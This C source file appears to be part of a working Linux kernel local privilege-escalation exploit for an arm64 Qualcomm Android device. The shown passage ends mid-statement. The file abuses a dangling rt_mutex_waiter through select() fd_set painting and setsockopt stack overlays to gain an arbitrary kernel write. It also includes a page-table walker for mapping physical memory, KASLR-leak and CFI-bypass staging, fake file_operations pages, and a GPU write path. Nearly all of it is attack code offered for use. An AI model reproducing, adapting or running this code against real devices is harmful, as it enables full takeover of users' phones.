#include "common.h"
#include "runtime_struct_offsets.h"
#include <time.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

/* ABI for the in-process CVE-2023-21665 victim test. */
struct drm_msm_gem_new  { uint64_t size; uint32_t flags; uint32_t handle; };
struct drm_msm_gem_info { uint32_t handle; uint32_t flags; uint64_t offset; };
struct drm_mode_create_dumb { uint32_t height, width, bpp, flags, handle, pitch; uint64_t size; };
struct drm_mode_map_dumb { uint32_t handle, pad; uint64_t offset; };
struct drm_prime_handle { uint32_t handle; uint32_t flags; int32_t fd; };
struct kgsl_map_user_mem {
  int fd; unsigned long gpuaddr; size_t len; size_t offset;
  unsigned long hostptr; unsigned int memtype; unsigned int flags;
};
#define DRM_IOCTL_MSM_GEM_NEW_  _IOWR('d', 0x42, struct drm_msm_gem_new)
#define DRM_IOCTL_MSM_GEM_INFO_ _IOWR('d', 0x43, struct drm_msm_gem_info)
#define DRM_IOCTL_CREATE_DUMB_  _IOWR('d', 0xb2, struct drm_mode_create_dumb)
#define DRM_IOCTL_MAP_DUMB_     _IOWR('d', 0xb3, struct drm_mode_map_dumb)
#define DRM_IOCTL_PRIME_HANDLE_TO_FD_ _IOWR('d', 0x2d, struct drm_prime_handle)
#define IOCTL_KGSL_MAP_USER_MEM_ _IOWR(0x09, 0x15, struct kgsl_map_user_mem)
struct ion_allocation_data { uint64_t len; uint32_t heap_id_mask, flags, fd, unused; };
#define ION_IOC_ALLOC_ _IOWR('I', 0, struct ion_allocation_data)

/* KGSL submission ABI for the GPU-write test (KGW=1). */
struct kgsl_drawctxt_create { uint32_t flags; uint32_t drawctxt_id; };
struct kgsl_ibdesc { unsigned long gpuaddr; unsigned long __pad; size_t sizedwords; unsigned int ctrl; };
struct kgsl_ringbuffer_issueibcmds {
  unsigned int drawctxt_id; unsigned long ibdesc_addr;
  unsigned int numibs; unsigned int timestamp; unsigned int flags;
};
#define IOCTL_KGSL_DRAWCTXT_CREATE_ _IOWR(0x09, 0x13, struct kgsl_drawctxt_create)
#define IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS_ _IOWR(0x09, 0x10, struct kgsl_ringbuffer_issueibcmds)
struct kgsl_device_waittimestamp { unsigned int timestamp; unsigned int timeout; };
#define IOCTL_KGSL_DEVICE_WAITTIMESTAMP_ _IOW(0x09, 0x6, struct kgsl_device_waittimestamp)
#define CP_MEM_WRITE 0x3du
/* cp_type7_packet() embeds odd-parity bits for the count (bit 15) and the opcode
 * (bit 23); a hand-built header must include them or the CP ignores the packet. */
static uint32_t cp_parity(uint32_t v) {
  v ^= v >> 16; v ^= v >> 8; v ^= v >> 4; v ^= v >> 2; v ^= v >> 1;
  return v & 1u;
}
static uint32_t cp_type7_packet(uint32_t op, uint32_t cnt) {
  return (7u << 28) | (cnt & 0x3fffu) | (cp_parity(cnt) << 15) |
         ((op & 0x7fu) << 16) | (cp_parity(op) << 23);
}

/* --- dirty-PTE helper: map an arbitrary physical page into userspace --------
 * arm64 (VA_BITS=39, 4K granule) = 3 levels: pgd[38:30] pmd[29:21] pte[20:12].
 * Returns the PTE slot address and value for a user VA. */
#define PTE_OA_MASK 0x0000FFFFFFFFF000ULL
static int gl_pt_stage;
/* Generic walk: lv=3 => shifts {30,21,12}; lv=4 => {39,30,21,12}.
 * Returns the leaf descriptor slot/value; gl_pt_stage records the failure stage. */
static int gl_pte_walk2(int fd, uintptr_t pgd, uintptr_t va, int lv, uint64_t ms,
                        uintptr_t *slot, uint64_t *val) {
  static const int sh4[4] = {39, 30, 21, 12};
  static const int sh3[3] = {30, 21, 12};
  const int *sh = (lv == 4) ? sh4 : sh3;
  if (!ms) ms = 0x80000000ULL;
  uintptr_t t = pgd;
  gl_pt_stage = 0;
  for (int k = 0; k < lv; k++) {
    uint64_t d = 0;
    size_t idx = (va >> sh[k]) & 0x1ff;
    if (configfs_read_once(fd, t + idx * 8, &d, 8) != (ssize_t)8) { gl_pt_stage = 1; return 0; }
    if (k == lv - 1) {
      *slot = t + idx * 8; *val = d;
      if ((d & 3) == 0) { gl_pt_stage = 2; return 0; }
      return 1;
    }
    /* intermediate descriptor: table address is PHYSICAL -> convert to VA */
    if ((d & 3) != 3) { gl_pt_stage = 2; return 0; }
    uint64_t pa = d & PTE_OA_MASK;
    uintptr_t nva = (uintptr_t)(pa - ms + (uint64_t)P0_PAGE_OFFSET);
    if (!is_direct_ptr(nva)) { gl_pt_stage = 3; return 0; }
    t = nva;
  }
  return 0;
}

static double fops_elapsed_ms(struct timespec *ref) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - ref->tv_sec) * 1000.0 + (now.tv_nsec - ref->tv_nsec) / 1e6;
}
extern int pselect_custom_write;

#define PSELECT_CFI_ROUTE_ATTEMPTS 8
#define PSELECT_EXPECTED_READY 9

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
#ifdef COMPAT32
  /* shift=6 route: select blocks; fire the walk while do_select() is parked. */
  int default_delay = 20000;
#else
  int default_delay = pselect_custom_write_enabled() ? 0 : -1;
#endif
  int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
                               default_delay, -1, 1000000);
  if (override >= 0) {
    return override;
  }

  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
#ifdef COMPAT32
  /* compat_get_bitmap(): internal word k == user32[2k] | user32[2k+1]<<32 */
  uint32_t *bits = (uint32_t *)set;
  bits[2 * word] = (uint32_t)value;
  bits[2 * word + 1] = (uint32_t)(value >> 32);
#else
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
#endif
}

uint64_t fdset_get_word(const fd_set *set, int word) {
#ifdef COMPAT32
  const uint32_t *bits = (const uint32_t *)set;
  return ((uint64_t)bits[2 * word + 1] << 32) | bits[2 * word];
#else
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
#endif
}

static int pselect_words_per_set(void) {
  /* The kernel's struct fd_set_bits always uses native 64-bit longs
   * (BITS_PER_LONG == 64) even on the compat (32-bit) path -- verified in
   * compat_core_sys_select: size = FDS_LONGS(n)*8 with FDS_LONGS = (n+63)/64.
   * So the per-set word count must be computed with 64-bit words in both the
   * 64-bit and 32-bit builds.  sizeof(unsigned long) is 4 in the armhf child,
   * which previously yielded 10 instead of 5 and misplaced every painted
   * waiter field by 5 longs (40 bytes). */
  return (PSELECT_ROUTE_NFDS + 63) / 64;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  /* The kernel lays out bits = in|out|ex|res_in|res_out|res_ex, each
   * words_per_set longs.  do_select computes res_X = X & ready, so forcing
   * res_X word k means writing X word k (with those fds selected+ready).
   * On 4.14 the pselect6 route puts the freed rt_mutex_waiter at word 12:
   * task(6)/lock(7) land in res_in, prio(8)/deadline(9) in res_out. */
  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0: /* in */
    case 3: /* res_in  <- in  word k */
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1: /* out */
    case 4: /* res_out <- out word k */
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2: /* ex */
    case 5: /* res_ex  <- ex  word k */
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int shift = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
  int global_word = shift + waiter_word;
  int placed = pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               PSELECT_ROUTE_NFDS);
  }
}

#ifdef COMPAT32
static int compat_fd_isset(const fd_set *set, int fd) {
  const uint32_t *w = (const uint32_t *)set;
  int k = fd / 64, j = fd % 64;
  return (w[2 * k + (j >> 5)] >> (j & 31)) & 1u;
}
#define FD_ISSET(fd, set) compat_fd_isset((set), (fd))
#endif

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
  (void)write_fd;

  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  if (env_flag("PSELECT_SIMPLE_LAYOUT", 0)) {
    fdset_put_word(in, 0, fake_w0);
    fdset_put_word(in, 3, 0);
    fdset_put_word(ex, 0,
                   pselect_custom_write_enabled() ? fake_task :
                   data_addr(INIT_TASK));
    fdset_put_word(ex, 1, fake_lock);
    fdset_put_word(ex, 2, 3);
    fdset_put_word(ex, 3, 0);
    return;
  }

  int compact = active_offsets && active_offsets->waiter_compact;

  int words_per_set = pselect_words_per_set();
  struct pselect_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  };

  struct pselect_waiter_word words_compact[] = {
    {2, 0, "tree_left"},
    {3, 0, "pi_parent"},
    {4, 0, "pi_right"},
    {5, 0, "pi_left"},
    {6, pselect_custom_write_enabled() ? fake_task : data_addr(INIT_TASK), "task"},
    {7, fake_lock, "lock"},
    {8, 0, "prio"},
    {9, 0, "deadline"},
  };

  struct pselect_waiter_word words[] = {
    {2, 0, "tree_pc"},
    {3, 0, "tree_right"},
    {4, 0, "tree_left"},
    {5, 1, "tree_prio"},
    {6, 0, "tree_deadline"},
    {7, 0, "pi_parent"},
    {8, 0, "pi_right"},
    {9, 0, "pi_left"},
    {10, 1, "pi_prio"},
    {11, 0, "pi_deadline"},
    {12, pselect_custom_write_enabled() ? fake_task : data_addr(INIT_TASK),
     "task"},
    {13, fake_lock, "lock"},
    {14, 3, "wake_state"},
  };

  struct pselect_waiter_word *active_words = compact ? words_compact : words;
  size_t active_count = compact
      ? sizeof(words_compact) / sizeof(words_compact[0])
      : sizeof(words) / sizeof(words[0]);

  for (size_t i = 0; i < active_count; i++) {
    struct pselect_waiter_word *w = &active_words[i];
    pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  struct timespec route_t0;
  clock_gettime(CLOCK_MONOTONIC, &route_t0);
  int calls = 0;
  int success = 0;
  int route_verified = 0;
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
#ifdef COMPAT32
    int block_fd = pipefd[0]; /* empty read end: do_select will block */
#else
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                 errno);
      block_fd = pipefd[0];
    }
#endif
    if (block_fd >= 0 && block_fd != pipefd[0]) {
      struct itimerspec its; memset(&its, 0, sizeof its);
      its.it_value.tv_nsec = 1000;
      syscall(SYS_timerfd_settime, block_fd, 0, &its, NULL);
    }
    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      if (block_fd != pipefd[0]) {
        close(block_fd);
      }
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    pr_info("pselect route setup attempt=%d simple=%d shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            route_attempt,
            env_flag("PSELECT_SIMPLE_LAYOUT", 0),
            env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14),
            page_base, fake_lock, fake_w0, fake_task,
            (unsigned long long)fdset_get_word(&in, 0),
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&ex, 0),
            (unsigned long long)fdset_get_word(&ex, 1),
            (unsigned long long)fdset_get_word(&ex, 2),
            (unsigned long long)fdset_get_word(&ex, 3));
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&pselect_select_done, 0);
    atomic_store(&pselect_walk_done, 0);
    int delay_usec = route_delay_usec(route_attempt);
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timeval timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
#ifdef PSELECT_TIMEOUT_USEC
      .tv_usec = PSELECT_TIMEOUT_USEC,
#else
      .tv_usec = 0,
#endif
    };

    pr_info("pselect pre-select +%.0fms\n", fops_elapsed_ms(&route_t0));
    errno = 0;
#ifdef COMPAT32
    int ret = syscall(142 /* ARM _newselect -> compat_sys_select */,
                      PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
#else
    int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
#endif
    int saved_errno = errno;
    /* do_select() filled res_in; park in userspace (no syscall) so the
     * consumer's rt_mutex_adjust_pi() reads the intact fake waiter. */
    atomic_store(&pselect_select_done, 1);
    for (int spin = 0;
         spin < 2000000000 && !atomic_load(&pselect_walk_done);
         spin++) {
      __asm__ volatile("yield" ::: "memory");
    }
    pr_info("pselect post-select +%.0fms ret=%d walked=%d\n",
            fops_elapsed_ms(&route_t0), ret, atomic_load(&pselect_walk_done));
    pr_info("pselect RB in3=%016llx in4=%016llx out0=%016llx out1=%016llx "
            "(want task=%016zx lock=%016zx)\n",
            (unsigned long long)fdset_get_word(&in, 3),
            (unsigned long long)fdset_get_word(&in, 4),
            (unsigned long long)fdset_get_word(&out, 0),
            (unsigned long long)fdset_get_word(&out, 1),
            fake_task, fake_lock);
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec);

    int route_quality_miss = 0;
    int route_signal = calls > 0 && success > 0;
    int cfi_probed = 0;
    if (route_signal) {
      cfi_probed = 1;
      if (ret != PSELECT_EXPECTED_READY) {
        pr_info("pselect route probing cfi attempt=%d ret=%d expected=%d\n",
                route_attempt, ret, PSELECT_EXPECTED_READY);
      }
      if (pselect_custom_write_enabled()) {
        cfi_last_step = 0;
        cfi_last_errno = 0;
        route_verified = 1;
        if (route_only_mode) {
          /* 32-bit route child: the 64-bit parent runs try_cfi_stage() */
        } else if (active_offsets && active_offsets->off_system_unbound_wq &&
            !root_child_done) {
          try_cfi_stage();
        }
      } else if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
    }
    if (!route_verified && route_signal) {
      route_quality_miss = 1;
      if (!cfi_probed) {
        cfi_last_step = 35;
        cfi_last_errno = saved_errno;
      }
      pr_info("pselect route quality miss attempt=%d/%d ret=%d expected=%d delay=%d; refreshing FOPS page\n",
              route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, ret,
              PSELECT_EXPECTED_READY, delay_usec);
    } else if (!route_verified) {
      cfi_last_step = 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_quality_miss) {
      continue;
    }
    if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
      break;
    }
    pr_info("pselect cfi write miss attempt=%d/%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_errno);
  }
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}


/* ============================================================================
 * setsockopt-based stack overlay (native 64-bit, Linux 4.14 on SM8150)
 *
 * Why: the pselect route paints the dangling rt_mutex_waiter through fd_set
 * bitmaps, which drags in word/shift/ABI/`res_*`-zeroing complications.  A far
 * simpler stack writer exists: sock_setsockopt() with an unknown
 * SOL_SOCKET optname keeps a 256-byte buffer on the kernel stack and copies
 * user bytes into it verbatim.
 *
 * Geometry verified from the device kernel (Image @ 0xffffff8008000000):
 *   SyS_setsockopt  : stp x29,x16,[sp,#-80]!   -> 0x50
 *   sock_setsockopt : sub sp,sp,#0x180, buf = sp+0x10  -> 0x180
 *   => buf = SP0 - 0x1c0   (fixed; no shift guessing)
 *   SyS_futex (native): sub sp,sp,#0x70 ; do_futex frame 0x210, rt_waiter=sp+0xd0
 *   => dangling waiter = SP0 - 0x1b0
 *   rt_mutex_waiter: task @ +0x30, lock @ +0x38
 *   => waiter->task == buf[0x40] ,  waiter->lock == buf[0x48]
 *
 * optname 1000 (0x3e8) takes the path:
 *     add x0, sp, #0x10 ; bl memset(buf,0,0xff)
 *     csel len = min(optlen, 0xfe) ; bl __arch_copy_from_user(buf, optval, len)
 * i.e. the copy happens before any optname handling, unprivileged.
 *
 * PAYLOAD: the copy is 0x60 bytes, so buf[0x10..0x5f] is the dangling
 * waiter's first 0x50 bytes -- i.e. the complete rb_erase_cached() node:
 *   tree_entry = (pc, rb_right, rb_left) = (VALUE, TARGET, 0)  -> the PI write
 *   task = fake_task/INIT_TASK, lock = fake_lock, prio = FAKE_WAITER_PRIO
 * (the write is child->__rb_parent_color = pc, i.e. *(TARGET) = VALUE).
 *
 * NOTE: setsockopt does not block.  The consumer fires while this thread parks
 * in userspace (no further syscalls), so the kernel stack region stays intact.
 * ============================================================================ */
int sock_paint_fd = -1;

/* SSOPT_FAKE_TASK=1: use the fake page as the waiter's task */
static int ssopt_fake_task_enabled(void) {
  return pselect_custom_write_enabled() || env_flag("SSOPT_FAKE_TASK", 0);
}
/* Design v3 hold: an EMPTY pipe read end selected in a small-nfds select() makes
 * the route thread block INSIDE the kernel while the consumer walks, so IRQs
 * cannot land on the paint (they land far below the current -- deep -- frame).
 * nfds = 64 keeps core_sys_select's used stack_fds at SP0-0x210..SP0-0x1e0,
 * i.e. below the waiter at SP0-0x1b0 (nfds=192 would have zeroed it). */
static int ssopt_hold_r = -1;
static int ssopt_hold_w = -1;

/* payload offset -> page-relative offset of the leaked fake page
 * (payload_base = base + SKB_DATA_DELTA) */
#define SSOPT_PG(payload_off) ((size_t)((int64_t)(payload_off) + (SKB_DATA_DELTA)))

void do_setsockopt_fake_lock_route(void) {
  if (!fake_lock || !fake_task) {
    cfi_last_step = 40;
    pr_error("ssopt route missing lock=%016zx task=%016zx\n", fake_lock, fake_task);
    return;
  }
  if (sock_paint_fd < 0) {
    sock_paint_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_paint_fd < 0) {
      cfi_last_step = 41;
      pr_error("ssopt socket() errno=%d\n", errno);
      return;
    }
  }

  /* The in-kernel hold must not need ANY syscall after the paint (a syscall
   * would reuse this stack region).  Prepare the empty-pipe read end now, before
   * the first attempt. */
  if (ssopt_hold_r < 0) {
    int pfd[2];
    if (pipe(pfd) == 0) {
      if (pfd[0] >= 64) {
        int nb = fcntl(pfd[0], F_DUPFD, 3);
        if (nb >= 0 && nb < 64) { close(pfd[0]); pfd[0] = nb; }
      }
      ssopt_hold_r = pfd[0];
      ssopt_hold_w = pfd[1];
    }
    pr_info("ssopt hold pipe r=%d w=%d\n", ssopt_hold_r, ssopt_hold_w);
  }

  /* RB_EMPTY_NODE route: leak T's kernel stack (=> &waiter) before painting.
   * The dummy paints run INSIDE the perf sampler window; they set the waiter
   * region to zeros, which the real paint below overwrites. */
  if (env_flag("SSOPT_EMPTY", 0) && !ssopt_leaked_waiter) {
    /* Leak T's OWN kernel stack here: this route runs inside the waiter thread
     * (main.c waiter_thread), which is the thread whose stack holds the dangling
     * rt_mutex_waiter.  (Doing it in prepare_perf_fake_page leaked the MAIN
     * thread's stack instead -> bogus waiter -> corrupt-tree walk -> soft lockup.)
     * The burst is light (period 20 kHz + 400 paints) so it cannot trip the
     * hardware watchdog. */
    ssopt_set_waiter_lo();
    ssopt_leaked_waiter = 0;
    if (ssopt_perf_begin() == 0) {
      static unsigned char dummy[0x100];
      memset(dummy, 0, sizeof dummy);
      for (int i = 0; i < 400; i++)
        setsockopt(sock_paint_fd, SOL_SOCKET, 1000, dummy, 0x60);
      ssopt_perf_drain();
      ssopt_leaked_waiter = ssopt_perf_result();
      ssopt_perf_close();
    }
    pr_info("ssopt waiter = %016zx (leak in T)\n",
            (uintptr_t)ssopt_leaked_waiter);
    fsync(1);
  }

  struct timespec t0;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  int calls = 0, success = 0;
  for (int attempt = 1; attempt <= PSELECT_CFI_ROUTE_ATTEMPTS; attempt++) {
    unsigned char buf[0x60];
    memset(buf, 0, sizeof buf);
    if (env_flag("SSOPT_LOCKPROBE", 0)) {
      /* Deterministic "did the paint reach the stack?" probe: lock = a
       * non-canonical marker so chain[5] raw_spin_trylock() faults at once
       * (KP in milliseconds, never a hang), and x24 reveals whether the copy
       * landed (0x1a2b00000048) or stayed zeroed by the memset (0). */
      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task : data_addr(INIT_TASK));
      put64(buf, 0x48, 0x1a2b00000048ULL);
    } else if (env_flag("SSOPT_SCAN", 0)) {
      /* one-run probe: distinct non-canonical value per buf slot so the panic
       * register x24 reveals which slot lands on waiter->lock */
      for (int i = 0; i < 0x60; i += 8)
        put64(buf, i, 0x1a2b00000000ULL + (uint64_t)i);
    } else if (env_flag("SSOPT_SCAN2", 0)) {
      /* probe: distinct marker per slot, but keep lock valid so the walk
       * passes trylock and reaches rb_erase; panic x24 -> slot of
       * waiter->lock, x9 -> slot of waiter->tree_entry.parent_color */
      for (int i = 0; i < 0x60; i += 8)
        put64(buf, i, 0x1a2b00000000ULL + (uint64_t)i);
      put64(buf, 0x40, fake_task);
      put64(buf, 0x48, fake_lock);
    } else if (env_flag("SSOPT_RANGE", 0)) {
      /* diagnostic: paint a solid run so a wrong offset still hits lock */
      for (int i = 0x10; i <= 0x58; i += 8) put64(buf, i, fake_lock);
    } else if (env_flag("SSOPT_NODEPROBE", 0)) {
      /* decisive probe: are the painted tree_entry words still there at [7]? */
      put64(buf, 0x10, 0x1a2b00000010ULL);
      put64(buf, 0x18, 0x1a2b00000018ULL);
      put64(buf, 0x20, 0x1a2b00000020ULL);
      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task
                                                 : data_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
      put64(buf, 0x58, 0);
    } else if (env_flag("SSOPT_EMPTY", 0) && ssopt_leaked_waiter) {
      /* RB_EMPTY_NODE(&waiter->tree_entry)  <=>  parent_color == &tree_entry,
       * and tree_entry sits at offset 0 of the waiter, so paint the waiter's own
       * address.  rt_mutex_dequeue() then returns immediately: no rb_erase_cached
       * at all, so the clobbered children (waiter+0x08/+0x10) are never read.
       * The PI write must therefore come from chain[11] (pi-tree in our page):
       * requires fake_lock->owner != 0 and waiter->task valid. */
      put64(buf, 0x10, ssopt_leaked_waiter);
      put64(buf, 0x18, 0);
      put64(buf, 0x20, 0);
      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task
                                                 : data_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
      put64(buf, 0x58, 0);
    } else if (env_flag("SSOPT_BASELINE", 0)) {
      /* Baseline = bản ghostlock53/54: chỉ task@buf[0x40], lock@buf[0x48],
       * KHÔNG sơn prio (buf[0x50]) và KHÔNG sơn tree_entry; len=0x50. */
      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task : data_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
    } else if (ssopt_write_pc && ssopt_write_right && !ssopt_write_left) {
      /* Full waiter payload (waiter = SP0-0x1b0 = buf+0x10):
       *   buf[0x10] -> waiter+0x00  tree.parent_color = ssopt_write_pc (VALUE)
       *   buf[0x18] -> waiter+0x08  tree.rb_right     = ssopt_write_right (TARGET)
       *   buf[0x20] -> waiter+0x10  tree.rb_left      = 0
       *   buf[0x40] -> waiter+0x30  task              = fake_task/INIT_TASK
       *   buf[0x48] -> waiter+0x38  lock              = fake_lock
       *   buf[0x50] -> waiter+0x40  prio              = FAKE_WAITER_PRIO
       *   buf[0x58] -> waiter+0x48  deadline          = 0
       * Same triple that prepare_skb_payload() puts into W0's pi_tree, so
       * chain[7] rt_mutex_dequeue()/rb_erase_cached() itself performs the PI
       * write:  *(node->rb_right) = node->__rb_parent_color, i.e.
       * *(TARGET) = VALUE, with rebalance == NULL (rb_right != 0).  The
       * collateral parent->rb_right write lands in our page (parent =
       * VALUE & ~3, i.e. fake_fops+0x08 == fops->llseek; repaired later by
       * repair_fake_fops_llseek()).
       * prio MUST differ from task->prio, otherwise rt_mutex_adjust_pi() and
       * chain[3] take the rt_mutex_waiter_equal() early-out and NOTHING is
       * written (silent EINVAL-like failure).  FAKE_WAITER_PRIO (140) > the
       * exploit's normal prio (120) also keeps W on the left of fake_w0 in the
       * fake tree, so chain[11] sees waiter == rt_mutex_top_waiter(lock). */
      if (env_flag("SSOPT_NO_TREE", 0)) {
        /* isolation probe: leave the rb node "empty" (children/parent = 0) so
         * chain[7] takes the harmless case-1/parent-NULL path. */
        put64(buf, 0x10, 0);
        put64(buf, 0x18, 0);
        put64(buf, 0x20, 0);
      } else {
        put64(buf, 0x10, ssopt_write_pc);
        put64(buf, 0x18, ssopt_write_right);
        put64(buf, 0x20, ssopt_write_left);
      }
      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task : data_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
      put64(buf, 0x58, 0);
    } else {
      /* Fallback: no usable (value,target,0) triple -> keep tree_entry zeroed
       * so chain[7] rb_erase_cached() is harmless (case 1, parent NULL) and the
       * write has to come from chain[11] through the page's W0 pi_tree. */
      put64(buf, 0x40, ssopt_fake_task_enabled() ? fake_task : data_addr(INIT_TASK));
      put64(buf, 0x48, fake_lock);
      put64(buf, 0x50, (uint64_t)FAKE_WAITER_PRIO);
      put64(buf, 0x58, 0);
    }

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&pselect_select_done, 0);
    atomic_store(&pselect_walk_done, 0);
    int delay_usec = route_delay_usec(attempt);
    /* Allow 0: with the spin-park hold the consumer must fire ASAP to keep the
     * clobber window (IRQ at EL0 while T spins) as small as possible.  (The old
     * 20 ms floor was needed only by the select-based route.) */
    if (delay_usec < 0) delay_usec = 0;
    atomic_store(&main_route_delay_usec, delay_usec);

    pr_info("ssopt pre paint +%.0fms attempt=%d task=%016zx lock=%016zx len=%zu "
            "scan=%d baseline=%d hold=%d quiet=%d owner0=%d no_tree=%d "
            "no_prio=%d lockprobe=%d\n",
            fops_elapsed_ms(&t0), attempt, fake_task, fake_lock, sizeof buf,
            env_flag("SSOPT_SCAN", 0), env_flag("SSOPT_BASELINE", 0),
